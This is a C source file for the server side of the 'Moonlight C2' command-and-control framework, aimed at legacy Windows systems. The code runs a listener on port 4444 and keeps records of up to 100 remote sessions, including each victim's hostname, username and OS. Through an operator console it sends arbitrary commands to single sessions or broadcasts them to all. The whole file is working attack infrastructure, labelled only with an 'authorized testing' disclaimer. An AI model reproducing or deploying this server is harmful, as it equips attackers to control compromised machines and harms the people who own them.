/*
 * Moonlight C2 Framework - Server Component
 * Target: Windows XP/2000/95/Server 2003/2008
 * Purpose: Penetration Testing and Red Team Operations
 * 
 * WARNING: For authorized security testing only
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <time.h>

#pragma comment(lib, "ws2_32.lib")

#define SERVER_PORT 4444
#define MAX_CLIENTS 100
#define BUFFER_SIZE 8192
#define HEARTBEAT_INTERVAL 30

typedef struct {
    SOCKET socket;
    struct sockaddr_in address;
    char hostname[256];
    char username[256];
    char os_version[256];
    char ip_address[64];
    int session_id;
    BOOL active;
    time_t last_heartbeat;
    DWORD process_id;
} ClientSession;

typedef struct {
    ClientSession clients[MAX_CLIENTS];
    int client_count;
    CRITICAL_SECTION lock;
} SessionManager;

SessionManager g_SessionManager;
BOOL g_ServerRunning = TRUE;

// Function prototypes
void InitializeSessionManager();
void CleanupSessionManager();
int AddClientSession(SOCKET sock, struct sockaddr_in addr);
void RemoveClientSession(int session_id);
ClientSession* GetClientSession(int session_id);
void ListActiveSessions();
DWORD WINAPI ClientHandlerThread(LPVOID param);
DWORD WINAPI HeartbeatMonitorThread(LPVOID param);
void ProcessCommand(int session_id, const char* command);
void SendToClient(int session_id, const char* data);
void BroadcastToAllClients(const char* data);
void DisplayBanner();
void ServerConsole();

void InitializeSessionManager() {
    memset(&g_SessionManager, 0, sizeof(SessionManager));
    InitializeCriticalSection(&g_SessionManager.lock);
    printf("[+] Session manager initialized\n");
}

void CleanupSessionManager() {
    EnterCriticalSection(&g_SessionManager.lock);
    
    for (int i = 0; i < g_SessionManager.client_count; i++) {
        if (g_SessionManager.clients[i].active) {
            closesocket(g_SessionManager.clients[i].socket);
        }
    }
    
    LeaveCriticalSection(&g_SessionManager.lock);
    DeleteCriticalSection(&g_SessionManager.lock);
    printf("[+] Session manager cleaned up\n");
}

int AddClientSession(SOCKET sock, struct sockaddr_in addr) {
    EnterCriticalSection(&g_SessionManager.lock);
    
    int session_id = -1;
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (!g_SessionManager.clients[i].active) {
            g_SessionManager.clients[i].socket = sock;
            g_SessionManager.clients[i].address = addr;
            g_SessionManager.clients[i].session_id = i;
            g_SessionManager.clients[i].active = TRUE;
            g_SessionManager.clients[i].last_heartbeat = time(NULL);
            
            strcpy(g_SessionManager.clients[i].ip_address, 
                   inet_ntoa(addr.sin_addr));
            
            if (i >= g_SessionManager.client_count) {
                g_SessionManager.client_count = i + 1;
            }
            
            session_id = i;
            break;
        }
    }
    
    LeaveCriticalSection(&g_SessionManager.lock);
    return session_id;
}

void RemoveClientSession(int session_id) {
    EnterCriticalSection(&g_SessionManager.lock);
    
    if (session_id >= 0 && session_id < MAX_CLIENTS) {
        if (g_SessionManager.clients[session_id].active) {
            closesocket(g_SessionManager.clients[session_id].socket);
            g_SessionManager.clients[session_id].active = FALSE;
            printf("[!] Session %d terminated\n", session_id);
        }
    }
    
    LeaveCriticalSection(&g_SessionManager.lock);
}

ClientSession* GetClientSession(int session_id) {
    if (session_id >= 0 && session_id < MAX_CLIENTS) {
        if (g_SessionManager.clients[session_id].active) {
            return &g_SessionManager.clients[session_id];
        }
    }
    return NULL;
}

void ListActiveSessions() {
    printf("\n+------+------------------+----------------+----------------------+\n");
    printf("| ID   | IP Address       | Hostname       | OS Version           |\n");
    printf("+------+------------------+----------------+----------------------+\n");
    
    EnterCriticalSection(&g_SessionManager.lock);
    
    for (int i = 0; i < g_SessionManager.client_count; i++) {
        if (g_SessionManager.clients[i].active) {
            printf("| %-4d | %-16s | %-14s | %-20s |\n",
                   g_SessionManager.clients[i].session_id,
                   g_SessionManager.clients[i].ip_address,
                   g_SessionManager.clients[i].hostname[0] ? 
                       g_SessionManager.clients[i].hostname : "Unknown",
                   g_SessionManager.clients[i].os_version[0] ? 
                       g_SessionManager.clients[i].os_version : "Unknown");
        }
    }
    
    LeaveCriticalSection(&g_SessionManager.lock);
    
    printf("+------+------------------+----------------+----------------------+\n\n");
}

DWORD WINAPI ClientHandlerThread(LPVOID param) {
    int session_id = (int)(DWORD_PTR)param;
    ClientSession* session = GetClientSession(session_id);
    
    if (!session) {
        return 1;
    }
    
    char buffer[BUFFER_SIZE];
    int bytes_received;
    
    printf("[+] New session established: %d from %s\n", 
           session_id, session->ip_address);
    
    // Request initial system information
    send(session->socket, "SYSINFO\n", 8, 0);
    
    while (g_ServerRunning && session->active) {
        memset(buffer, 0, BUFFER_SIZE);
        bytes_received = recv(session->socket, buffer, BUFFER_SIZE - 1, 0);
        
        if (bytes_received <= 0) {
            printf("[!] Session %d disconnected\n", session_id);
            break;
        }
        
        buffer[bytes_received] = '\0';
        session->last_heartbeat = time(NULL);
        
        // Parse response
        if (strncmp(buffer, "SYSINFO:", 8) == 0) {
            // Parse system info: SYSINFO:hostname|username|osversion|pid
            char* token = strtok(buffer + 8, "|");
            if (token) strncpy(session->hostname, token, sizeof(session->hostname) - 1);
            
            token = strtok(NULL, "|");
            if (token) strncpy(session->username, token, sizeof(session->username) - 1);
            
            token = strtok(NULL, "|");
            if (token) strncpy(session->os_version, token, sizeof(session->os_version) - 1);
            
            token = strtok(NULL, "|");
            if (token) session->process_id = atoi(token);
            
            printf("[+] Session %d info: %s\\%s on %s (PID: %d)\n",
                   session_id, session->hostname, session->username,
                   session->os_version, session->process_id);
        }
        else if (strncmp(buffer, "HEARTBEAT", 9) == 0) {
            // Heartbeat received
        }
        else {
            // Command output
            printf("\n[Session %d Output]\n%s\n", session_id, buffer);
        }
    }
    
    RemoveClientSession(session_id);
    return 0;
}

DWORD WINAPI HeartbeatMonitorThread(LPVOID param) {
    while (g_ServerRunning) {
        Sleep(10000); // Check every 10 seconds
        
        time_t current_time = time(NULL);
        EnterCriticalSection(&g_SessionManager.lock);
        
        for (int i = 0; i < g_SessionManager.client_count; i++) {
            if (g_SessionManager.clients[i].active) {
                if (current_time - g_SessionManager.clients[i].last_heartbeat > 60) {
                    printf("[!] Session %d timeout - no heartbeat\n", i);
                    g_SessionManager.clients[i].active = FALSE;
                }
            }
        }
        
        LeaveCriticalSection(&g_SessionManager.lock);
    }
    return 0;
}

void SendToClient(int session_id, const char* data) {
    ClientSession* session = GetClientSession(session_id);
    if (session) {
        send(session->socket, data, strlen(data), 0);
    }
}

void BroadcastToAllClients(const char* data) {
    EnterCriticalSection(&g_SessionManager.lock);
    
    for (int i = 0; i < g_SessionManager.client_count; i++) {
        if (g_SessionManager.clients[i].active) {
            send(g_SessionManager.clients[i].socket, data, strlen(data), 0);
        }
    }
    
    LeaveCriticalSection(&g_SessionManager.lock);
}

void ProcessCommand(int session_id, const char* command) {
    ClientSession* session = GetClientSession(session_id);
    if (!session) {
        printf("[!] Invalid session ID\n");
        return;
    }
    
    char buffer[BUFFER_SIZE];
    snprintf(buffer, BUFFER_SIZE, "CMD:%s\n", command);
    SendToClient(session_id, buffer);
}

void DisplayBanner() {
    printf("\n");
    printf("  ███╗   ███╗ ██████╗  ██████╗ ███╗   ██╗██╗     ██╗ ██████╗ ██╗  ██╗████████╗\n");
    printf("  ████╗ ████║██╔═══██╗██╔═══██╗████╗  ██║██║     ██║██╔════╝ ██║  ██║╚══██╔══╝\n");
    printf("  ██╔████╔██║██║   ██║██║   ██║██╔██╗ ██║██║     ██║██║  ███╗███████║   ██║   \n");
    printf("  ██║╚██╔╝██║██║   ██║██║   ██║██║╚██╗██║██║     ██║██║   ██║██╔══██║   ██║   \n");
    printf("  ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝██║ ╚████║███████╗██║╚██████╔╝██║  ██║   ██║   \n");
    printf("  ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   \n");
    printf("\n");
    printf("  Moonlight C2 Framework v1.0\n");
    printf("  Legacy Windows Command & Control System\n");
    printf("  For Authorized Penetration Testing Only\n");
    printf("\n");
}

void ServerConsole() {
    char command[512];
    
    printf("\nMoonlight C2 Console\n");
    printf("Type 'help' for available commands\n\n");
    
    while (g_ServerRunning) {
        printf("moonlight> ");
        if (!fgets(command, sizeof(command), stdin)) {
            break;
        }
        
        // Remove newline
        command[strcspn(command, "\n")] = 0;
        
        if (strlen(command) == 0) {
            continue;
        }
        
        if (strcmp(command, "help") == 0) {
            printf("\nAvailable Commands:\n");
            printf("  sessions         - List all active sessions\n");
            printf("  interact <id>    - Interact with a session\n");
            printf("  exec <id> <cmd>  - Execute command on session\n");
            printf("  kill <id>        - Terminate a session\n");
            printf("  broadcast <msg>  - Send message to all sessions\n");
            printf("  exit             - Shutdown server\n\n");
        }
        else if (strcmp(command, "sessions") == 0) {
            ListActiveSessions();
        }
        else if (strncmp(command, "exec ", 5) == 0) {
            int session_id;
            char cmd[400];
            if (sscanf(command + 5, "%d %[^\n]", &session_id, cmd) == 2) {
                ProcessCommand(session_id, cmd);
                printf("[+] Command sent to session %d\n", session_id);
            } else {
                printf("[!] Usage: exec <session_id> <command>\n");
            }
        }
        else if (strncmp(command, "kill ", 5) == 0) {
            int session_id = atoi(command + 5);
            RemoveClientSession(session_id);
        }
        else if (strcmp(command, "exit") == 0) {
            printf("[*] Shutting down server...\n");
            g_ServerRunning = FALSE;
            break;
        }
        else {
            printf("[!] Unknown command. Type 'help' for available commands\n");
        }
    }
}

int main(int argc, char* argv[]) {
    WSADATA wsa;
    SOCKET server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    int client_addr_size;
    int port = SERVER_PORT;
    
    if (argc > 1) {
        port = atoi(argv[1]);
    }
    
    DisplayBanner();
    
    // Initialize Winsock
    printf("[*] Initializing Winsock...\n");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("[!] WSAStartup failed: %d\n", WSAGetLastError());
        return 1;
    }
    
    // Initialize session manager
    InitializeSessionManager();
    
    // Create socket
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket == INVALID_SOCKET) {
        printf("[!] Socket creation failed: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    
    // Setup server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(port);
    
    // Bind socket
    if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        printf("[!] Bind failed: %d\n", WSAGetLastError());
        closesocket(server_socket);
        WSACleanup();
        return 1;
    }
    
    // Listen
    if (listen(server_socket, MAX_CLIENTS) == SOCKET_ERROR) {
        printf("[!] Listen failed: %d\n", WSAGetLastError());
        closesocket(server_socket);
        WSACleanup();
        return 1;
    }
    
    printf("[+] Server listening on port %d\n", port);
    
    // Start heartbeat monitor
    CreateThread(NULL, 0, HeartbeatMonitorThread, NULL, 0, NULL);
    
    // Start console in separate thread
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ServerConsole, NULL, 0, NULL);
    
    // Accept connections
    client_addr_size = sizeof(client_addr);
    
    while (g_ServerRunning) {
        client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &client_addr_size);
        
        if (client_socket == INVALID_SOCKET) {
            if (g_ServerRunning) {
                printf("[!] Accept failed: %d\n", WSAGetLastError());
            }
            continue;
        }
        
        int session_id = AddClientSession(client_socket, client_addr);
        if (session_id >= 0) {
            CreateThread(NULL, 0, ClientHandlerThread, (LPVOID)(DWORD_PTR)session_id, 0, NULL);
        } else {
            printf("[!] Max clients reached, connection rejected\n");
            closesocket(client_socket);
        }
    }
    
    // Cleanup
    CleanupSessionManager();
    closesocket(server_socket);
    WSACleanup();
    
    printf("[+] Server shutdown complete\n");
    return 0;
}
